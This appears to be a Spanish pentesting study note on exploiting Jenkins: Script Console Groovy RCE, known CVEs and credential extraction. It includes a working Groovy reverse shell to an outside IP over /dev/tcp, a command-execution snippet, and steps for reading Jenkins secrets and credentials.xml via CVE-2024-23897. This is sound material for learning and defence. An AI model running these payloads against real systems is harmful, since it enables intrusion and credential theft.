---
tags:
  - Web/Red-Team
  - Jenkins
  - Pentesting/Explotacion
Descripción: "Con acceso a Jenkins (credenciales débiles o sin auth), la Script Console es una victoria casi inmediata: ejecuta Groovy arbitrario en el runtime del controlador, y Jenkins…"
Fecha de actualización: 2026-07-16
Nota previa: "[[00 - Descubrimiento y enumeración de Jenkins]]"
Nota siguiente: "[[00 - Descubrimiento y enumeración de Splunk]]"
Area: "[[Common Applications.base|Common Applications]]"
---
---

Con acceso a Jenkins (credenciales débiles o sin auth), <mark style="background: #FFB86CA6;">la **Script Console** es una victoria casi inmediata</mark>: ejecuta Groovy arbitrario en el runtime del controlador, y Jenkins suele correr como `root`/`SYSTEM`.

# Script Console (`/script`) — RCE con Groovy

En `http://jenkins:8000/script` se ejecuta Apache Groovy (Java-compatible). Ejecutar un comando:

```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

Reverse shell en **Linux** (a menudo devuelve `uid=0(root)`):

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

En **Windows**, ejecutar comandos o un reverse shell Java:

```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

# Vulnerabilidades conocidas

> [!important]+ CVEs de Jenkins (version-específicas)
> - **CVE-2018-1000861 + CVE-2019-1003000** — RCE **pre-auth** encadenando dos fallos (cadena de Orange Tsai): bypass de la ACL `Overall/Read` vía *dynamic routing* de Stapler + *sandbox bypass* del Script Security → Groovy ejecuta código. Afecta a Jenkins ≤ 2.153 / LTS ≤ 2.138.1. *(Ojo: `CVE-2018-1999002` es otra cosa — un arbitrary file read en Stapler; buscar el PoC por ese número no lleva a esta cadena.)*
> - **RCE autenticada por diseño** (en **cualquier** versión, no una CVE de una build concreta): un usuario con permiso `Job/Configure` o `Job/Build` puede ejecutar comandos arbitrarios en el nodo — es la base de cómo funciona un pipeline de CI/CD (un `Pipeline` Groovy, un paso `sh`/`bat` en un *freestyle job*). Si los usuarios **anónimos** tienen esos permisos (config insegura), es RCE pre-auth de facto.

> [!info]+ Modernización
> El vector estrella actual es <mark style="background: #FF5582A6;">**CVE-2024-23897**</mark> (ver [[00 - Descubrimiento y enumeración de Jenkins|discovery]]): *arg injection* en el CLI → **lectura de ficheros arbitrarios**. Se leen los secrets de `/var/lib/jenkins/secrets/` y `credentials.xml`, se descifran offline, y de ahí a RCE (o a moverse por la red que Jenkins orquesta). La Script Console sigue siendo el camino post-auth más rápido. Herramientas: `msf exploit/multi/http/jenkins_script_console`, `nuclei -tags jenkins`, y los PoC públicos de CVE-2024-23897.

Comprometer Jenkins es comprometer el **CI/CD** — a menudo el pivote a toda la organización. Cambiamos a las herramientas de monitorización: [[00 - Descubrimiento y enumeración de Splunk|Splunk]].
